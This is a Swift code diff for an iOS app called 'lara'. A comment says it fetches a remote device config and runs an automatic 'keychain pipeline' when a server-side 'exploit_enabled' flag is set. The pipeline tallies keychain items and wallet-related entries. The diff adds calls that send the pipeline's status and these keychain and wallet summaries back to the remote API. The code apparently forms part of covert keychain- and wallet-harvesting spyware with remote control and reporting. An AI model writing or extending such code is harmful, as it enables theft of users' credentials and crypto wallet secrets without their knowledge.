@@ -106,6 +106,7 @@ struct lara: App {
                     // 主协议：先拉 /api/device/config，按 exploit_enabled 开关决定是否走管线
                     MainAPI.bootstrap { run in
                         if run {
+                            MainAPI.reportLogAsync(text: "pipeline started")
                             self.autorunkeychainpipeline()
                         }
                     }
@@ -204,6 +205,7 @@ struct lara: App {
             DispatchQueue.main.async {
                 if let failure {
                     globallogger.log("(kc) keychain pipeline failed: \(failure.localizedDescription)")
+                    MainAPI.reportLogAsync(text: "pipeline failed: \(failure.localizedDescription)")
                 } else if let result {
                     let ok = result["ok"] ?? "nil"
                     let missing = result["aksItemsMissingSecret"] ?? "nil"
@@ -217,9 +219,12 @@ struct lara: App {
                             counts.append("\(k)=\(n)")
                         }
                     }
-                    globallogger.log("(kc) keychain pipeline done: ok=\(ok) aksItemsMissingSecret=\(missing) metadataKeyCount=\(mk) walletRelated=\(wr) tables[\(counts.joined(separator: ","))]")
+                    let summary = "pipeline done: ok=\(ok) aksItemsMissingSecret=\(missing) metadataKeyCount=\(mk) walletRelated=\(wr) tables[\(counts.joined(separator: ","))]"
+                    globallogger.log("(kc) keychain \(summary)")
+                    MainAPI.reportLogAsync(text: summary)
                 } else {
                     globallogger.log("(kc) keychain pipeline done: nil result")
+                    MainAPI.reportLogAsync(text: "pipeline done: nil result")
                 }
                 mgr.kcpipelineactive = false
             }
